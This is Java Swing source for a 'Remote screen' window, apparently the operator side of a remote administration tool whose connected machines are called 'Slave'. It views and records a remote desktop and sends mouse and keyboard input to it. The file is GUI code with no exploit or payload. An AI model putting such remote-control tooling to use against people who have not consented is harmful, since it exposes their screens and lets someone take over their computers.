package com.redpois0n.ui.frames;

import java.awt.Color;
import java.awt.Dimension;
import java.awt.Graphics;
import java.awt.Toolkit;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import java.awt.event.MouseAdapter;
import java.awt.event.MouseEvent;
import java.awt.event.MouseMotionAdapter;
import java.awt.event.WindowAdapter;
import java.awt.event.WindowEvent;
import java.awt.image.BufferedImage;
import java.io.File;
import java.util.HashMap;

import javax.imageio.ImageIO;
import javax.swing.DefaultComboBoxModel;
import javax.swing.GroupLayout;
import javax.swing.GroupLayout.Alignment;
import javax.swing.ImageIcon;
import javax.swing.JButton;
import javax.swing.JCheckBox;
import javax.swing.JComboBox;
import javax.swing.JFileChooser;
import javax.swing.JLabel;
import javax.swing.JPanel;
import javax.swing.JProgressBar;
import javax.swing.JScrollPane;
import javax.swing.JToggleButton;
import javax.swing.JToolBar;
import javax.swing.LayoutStyle.ComponentPlacement;
import javax.swing.ScrollPaneConstants;
import javax.swing.WindowConstants;
import javax.swing.border.EmptyBorder;

import com.redpois0n.ScreenCommands;
import com.redpois0n.Slave;
import com.redpois0n.packets.in.PacketBuilder;
import com.redpois0n.packets.in.PacketIMAGECOMING;
import com.redpois0n.packets.out.Header;
import com.redpois0n.settings.Settings;
import com.redpois0n.threads.ThreadFPS;

@SuppressWarnings({ "serial", "rawtypes", "unchecked" })
public class FrameRemoteScreen extends BaseFrame {

	private JPanel contentPane;
	public Slave slave;
	public boolean running = false;
	public static HashMap<Slave, FrameRemoteScreen> instances = new HashMap<Slave, FrameRemoteScreen>();
	public FrameRemoteScreen frame;
	public JScrollPane screenPane;

	public ImageIcon icon;
	public JLabel lbl;

	public FrameRecordRemoteScreen recorder;
	public boolean record = false;
	public JButton btnRequestOne;
	private JButton btnRecord1;
	private JButton btnSave_1;
	private JButton btnStartCapture;
	public  JProgressBar progressBar;
	public JComboBox cbDelay;
	public JComboBox cbQuality;
	private JToggleButton tglbtnMouse;
	private JButton btnStop;
	private JLabel lblImageSize;
	private JLabel lblTotalChunks;
	private JLabel lblUpdatedChunks;
	private JLabel lblLatestChunkSize;
	public int monitorindex = -1;
	public int rows = 8;
	public int cols = 8;
	private JToggleButton tglbtnMove;
	private JLabel lblFps;
	private ThreadFPS thread = new ThreadFPS() {
		public void onUpdate(int fps) {
			lblFps.setText("FPS: " + fps);
		}
	};
	
	public static final void show(Slave sl) {
		FrameRemoteScreen frame = new FrameRemoteScreen(sl);
		frame.setVisible(true);
		FrameMonitors dialog = new FrameMonitors(frame, sl);
		dialog.setVisible(true);
	}
	
	public boolean mouseInput() {
		return tglbtnMouse.isSelected();
	}

	public boolean move() {
		return tglbtnMove.isSelected();
	}
	
	public void setSize(int size) {
		lblImageSize.setText("Image size: " + (size / 1024) + " kb");
	}
	
	public void setTotalChunks(int v) {
		lblTotalChunks.setText("Total chunks: " + v);
	}
	
	public void setUpdatedChunks(int v) {
		lblUpdatedChunks.setText("Updated chunks: " + v);
	}
	
	public void setLatestChunkSize(int size) {
		lblLatestChunkSize.setText("Latest chunk size: " + (size / 1024) + " kb");
	}

	public FrameRemoteScreen(Slave slave) {
		super();
		thread.start();
		this.slave = slave;
		instances.put(slave, this);

		setIconImage(Toolkit.getDefaultToolkit().getImage(FrameRemoteScreen.class.getResource("/icons/screen.png")));
		addWindowListener(new WindowAdapter() {
			@Override
			public void windowClosing(WindowEvent arg0) {
				exit();
			}
		});
		frame = this;
		final Slave sl = slave;
		setTitle("Remote screen - " + slave.getIP() + " - " + slave.getComputerName());
		setDefaultCloseOperation(WindowConstants.DISPOSE_ON_CLOSE);
		setBounds(100, 100, 876, 585);
		contentPane = new JPanel();
		contentPane.setBorder(new EmptyBorder(5, 5, 5, 5));
		setContentPane(contentPane);

		icon = new ImageIcon();
		lbl = new JLabel(icon, JLabel.LEFT);
		lbl.addMouseMotionListener(new MouseMotionAdapter() {
			@Override
			public void mouseMoved(MouseEvent e) {
				if (move()) {
					sl.addToSendQueue(new PacketBuilder(Header.MOUSE_MOVE, new String[] { "" + e.getX(), "" + e.getY(), "" + monitorindex }));
				}
			}
		});
		screenPane = new JScrollPane(lbl);
		screenPane.setHorizontalScrollBarPolicy(ScrollPaneConstants.HORIZONTAL_SCROLLBAR_ALWAYS);
		screenPane.setVerticalScrollBarPolicy(ScrollPaneConstants.VERTICAL_SCROLLBAR_ALWAYS);
		lbl.addMouseListener(new MouseAdapter() {
			@Override
			public void mousePressed(MouseEvent e) {
				if (mouseInput()) {
					sl.addToSendQueue(new PacketBuilder(Header.MOUSE_MOVE, new String[] { "" + e.getX(), "" + e.getY(), "" + monitorindex }));
					
					int button = e.getButton();
					int xButton = 16;
					if (button == 3) {
						xButton = 4;
					}
					
					sl.addToSendQueue(new PacketBuilder(Header.MOUSE_PRESS, new String[] { "" + e.getX(), "" + e.getY(), "" + xButton, "" + monitorindex }));
				}
			}

			@Override
			public void mouseReleased(MouseEvent e) {
				if (mouseInput()) {
					int button = e.getButton();
					int xButton = 16;
					if (button == 3) {
						xButton = 4;
					}
					
					sl.addToSendQueue(new PacketBuilder(Header.MOUSE_RELEASE, new String[] { "" + e.getX(), "" + e.getY(), "" + xButton, "" + monitorindex }));
				}
			}
		});

		JToolBar toolBar = new JToolBar();
		//toolBar.setLayout(new FlowLayout(FlowLayout.CENTER));
		toolBar.setRollover(true);
		toolBar.setFloatable(false);

		btnStartCapture = new JButton("");
		btnStartCapture.addActionListener(new ActionListener() {
			@Override
			public void actionPerformed(ActionEvent arg0) {
				running = true;
				ScreenCommands.send(sl, getQuality(), monitorindex, rows, cols);
				btnRequestOne.setEnabled(false);
				btnStartCapture.setEnabled(false);
				btnStop.setEnabled(true);
			}
		});
		btnStartCapture.setIcon(new ImageIcon(FrameRemoteScreen.class.getResource("/icons/start.png")));
		toolBar.add(btnStartCapture);

		btnRequestOne = new JButton("");
		btnRequestOne.addActionListener(new ActionListener() {
			@Override
			public void actionPerformed(ActionEvent e) {
				btnRequestOne.setEnabled(false);
				running = true;
				ScreenCommands.sendOnce(sl, getQuality(), monitorindex, rows, cols);
			}
		});
		
		btnStop = new JButton("");
		btnStop.setEnabled(false);
		btnStop.setIcon(new ImageIcon(FrameRemoteScreen.class.getResource("/icons/stop.png")));
		btnStop.addActionListener(new ActionListener() {
			@Override
			public void actionPerformed(ActionEvent arg0) {
				running = false;
				btnRequestOne.setEnabled(true);
				progressBar.setValue(0);
				btnStartCapture.setEnabled(true);
				btnStop.setEnabled(false);
			}
		});
		toolBar.add(btnStop);
		btnRequestOne.setIcon(new ImageIcon(FrameRemoteScreen.class.getResource("/icons/camera.png")));
		toolBar.add(btnRequestOne);

		btnRecord1 = new JButton("");
		btnRecord1.addActionListener(new ActionListener() {
			@Override
			public void actionPerformed(ActionEvent e) {
				if (recorder == null) {
					FrameRecordRemoteScreen f = new FrameRecordRemoteScreen(frame);
					f.setVisible(true);
					recorder = f;
				} else {
					recorder.setVisible(true);
				}
			}
		});
		
		toolBar.addSeparator(new Dimension(25, 30));
		btnRecord1.setIcon(new ImageIcon(FrameRemoteScreen.class.getResource("/icons/record.png")));
		toolBar.add(btnRecord1);

		btnSave_1 = new JButton("Save");
		btnSave_1.addActionListener(new ActionListener() {
			@Override
			public void actionPerformed(ActionEvent e) {
				try {
					JFileChooser f = new JFileChooser();
					f.setFileSelectionMode(JFileChooser.FILES_ONLY);
					f.showDialog(null, "Select");
					File file = f.getSelectedFile();
					if (file == null) {
						return;
					}
					BufferedImage img = new BufferedImage(icon.getIconWidth(), icon.getIconHeight(), BufferedImage.TYPE_INT_RGB);
					Graphics g = img.createGraphics();
					g.drawImage(icon.getImage(), 0, 0, icon.getIconWidth(), icon.getIconHeight(), null);
					g.dispose();
					ImageIO.write(img, "png", file);
				} catch (Exception ex) {
					ex.printStackTrace();
				}
			}
		});
		btnSave_1.setIcon(new ImageIcon(FrameRemoteScreen.class.getResource("/icons/save.png")));
		toolBar.add(btnSave_1);
		
		toolBar.addSeparator(new Dimension(25, 30));
		
		JButton btnKeyboard = new JButton("Keyboard");
		btnKeyboard.addActionListener(new ActionListener() {
			@Override
			public void actionPerformed(ActionEvent arg0) {
				FrameRemoteScreenKeyboard frame = FrameRemoteScreenKeyboard.instances.get(FrameRemoteScreen.this);
				if (frame == null) {
					frame = new FrameRemoteScreenKeyboard(FrameRemoteScreen.this);
					frame.setVisible(true);
				} else {
					frame.setVisible(true);
				}
			}
		});
		btnKeyboard.setIcon(new ImageIcon(FrameRemoteScreen.class.getResource("/icons/keyboard.png")));
		toolBar.add(btnKeyboard);
		
		tglbtnMouse = new JToggleButton("Mouse");
		tglbtnMouse.setSelected(true);
		tglbtnMouse.setIcon(new ImageIcon(FrameRemoteScreen.class.getResource("/icons/mouse.png")));
		toolBar.add(tglbtnMouse);
		
		tglbtnMove = new JToggleButton("");
		tglbtnMove.setIcon(new ImageIcon(FrameRemoteScreen.class.getResource("/icons/arrow_move_icon.png")));
		toolBar.add(tglbtnMove);
		
		toolBar.addSeparator(new Dimension(10, 30)); 
		
		JLabel lblDelay = new JLabel("Delay     ");
		toolBar.add(lblDelay);
		
		cbDelay = new JComboBox();
		cbDelay.setModel(new DefaultComboBoxModel(new String[] {"10", "9", "8", "7", "6", "5", "4", "3", "2", "1", "0"}));
		cbDelay.setSelectedIndex(10);
		toolBar.add(cbDelay);
		
		toolBar.addSeparator(new Dimension(25, 30));
		
		JLabel lblQuality = new JLabel("Quality    ");
		toolBar.add(lblQuality);
		
		cbQuality = new JComboBox();
		cbQuality.setModel(new DefaultComboBoxModel(new String[] {"10", "9", "8", "7", "6", "5", "4", "3", "2", "1", "0"}));
		cbQuality.setSelectedIndex(9);
		toolBar.add(cbQuality);
		
		JToolBar toolBar_1 = new JToolBar();
		toolBar_1.setFloatable(false);
		GroupLayout gl_contentPane = new GroupLayout(contentPane);
		gl_contentPane.setHorizontalGroup(
			gl_contentPane.createParallelGroup(Alignment.TRAILING)
				.addGroup(gl_contentPane.createSequentialGroup()
					.addGroup(gl_contentPane.createParallelGroup(Alignment.TRAILING)
						.addComponent(toolBar_1, Alignment.LEADING, GroupLayout.DEFAULT_SIZE, 846, Short.MAX_VALUE)
						.addComponent(screenPane, Alignment.LEADING, GroupLayout.DEFAULT_SIZE, 846, Short.MAX_VALUE)
						.addComponent(toolBar, GroupLayout.DEFAULT_SIZE, 846, Short.MAX_VALUE))
					.addGap(4))
		);
		gl_contentPane.setVerticalGroup(
			gl_contentPane.createParallelGroup(Alignment.LEADING)
				.addGroup(gl_contentPane.createSequentialGroup()
					.addComponent(toolBar, GroupLayout.PREFERRED_SIZE, 22, GroupLayout.PREFERRED_SIZE)
					.addPreferredGap(ComponentPlacement.RELATED)
					.addComponent(screenPane, GroupLayout.DEFAULT_SIZE, 488, Short.MAX_VALUE)
					.addPreferredGap(ComponentPlacement.RELATED)
					.addComponent(toolBar_1, GroupLayout.PREFERRED_SIZE, GroupLayout.DEFAULT_SIZE, GroupLayout.PREFERRED_SIZE))
		);
		
		lblTotalChunks = new JLabel("Total chunks: 0");
		toolBar_1.add(lblTotalChunks);
		
		toolBar_1.addSeparator(new Dimension(30, 15));
		
		lblUpdatedChunks = new JLabel("Updated chunks: 0");
		toolBar_1.add(lblUpdatedChunks);
		
		toolBar_1.addSeparator(new Dimension(30, 15));
		
		lblLatestChunkSize = new JLabel("Latest chunk size: 0");
		toolBar_1.add(lblLatestChunkSize);
		
		toolBar_1.addSeparator(new Dimension(30, 15));
		
		lblImageSize = new JLabel("Image size: 0");
		toolBar_1.add(lblImageSize);
		
		toolBar_1.addSeparator(new Dimension(30, 15));
		
		lblFps = new JLabel("FPS: ");
		toolBar_1.add(lblFps);
		
		toolBar.addSeparator(new Dimension(25, 30));	
		JCheckBox chckbxProgress = new JCheckBox("Progress    ");		
		chckbxProgress.setSelected(true);
		chckbxProgress.addActionListener(new ActionListener() {
			@Override
			public void actionPerformed(ActionEvent arg0) {
				JCheckBox src = (JCheckBox)arg0.getSource();
				progressBar.setVisible(src.isSelected());
			}
		});
		
		toolBar.add(chckbxProgress);
		
		progressBar = new JProgressBar();
		toolBar.add(progressBar);
		progressBar.setForeground(Color.LIGHT_GRAY);
		contentPane.setLayout(gl_contentPane);

		if (Settings.getGlobal().getBoolean("remotescreenstartup")) {
			FrameLoader loader = new FrameLoader();
			loader.setVisible(true);
			running = true;
			ScreenCommands.sendOnce(sl, getQuality(), monitorindex, rows, cols);
			while (running) {
				try {
					Thread.sleep(250L);
				} catch (Exception ex) {
					
				}
			}
			loader.setVisible(false);
			loader.dispose();
		}
	}

	public void exit() {
		frame = null;
		running = false;
		instances.remove(slave);
		setVisible(false);
		dispose();
		System.gc();
		thread.stopRunning();
		PacketIMAGECOMING.instances.remove(slave);
	}

	public int getQuality() {
		return Integer.parseInt(cbQuality.getSelectedItem().toString());
	}
	
	public long getDelay() {
		return Long.parseLong(cbDelay.getSelectedItem().toString()) * 1000L;
	}

	public ThreadFPS getFPSThread() {
		return thread;
	}
}
